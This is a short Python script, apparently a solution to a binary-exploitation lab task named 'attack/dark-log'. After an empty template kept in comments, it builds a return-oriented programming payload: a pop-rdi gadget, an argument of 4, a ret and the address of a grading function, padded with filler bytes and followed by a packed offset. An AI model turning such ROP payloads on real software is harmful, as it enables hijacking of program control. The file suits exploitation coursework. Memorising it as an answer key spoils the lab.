#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
'''
import sys

payload = b""

sys.stdout.buffer.write(payload)
'''
#!/usr/bin/env python3
import struct
import sys

def qword(value):
    return struct.pack("<Q", value)

POP_RDI = 0x4018a3
RET = 0x4018a4
GRADE_EVAL = 0x401677
RETURN_OFFSET = 168

chain = (
    qword(POP_RDI)
    + qword(4)
    + qword(RET)
    + qword(GRADE_EVAL)
)

payload = (
    chain.ljust(128, b"A")
    + b"B" * 128
    + struct.pack("<i", RETURN_OFFSET)
)

sys.stdout.buffer.write(payload)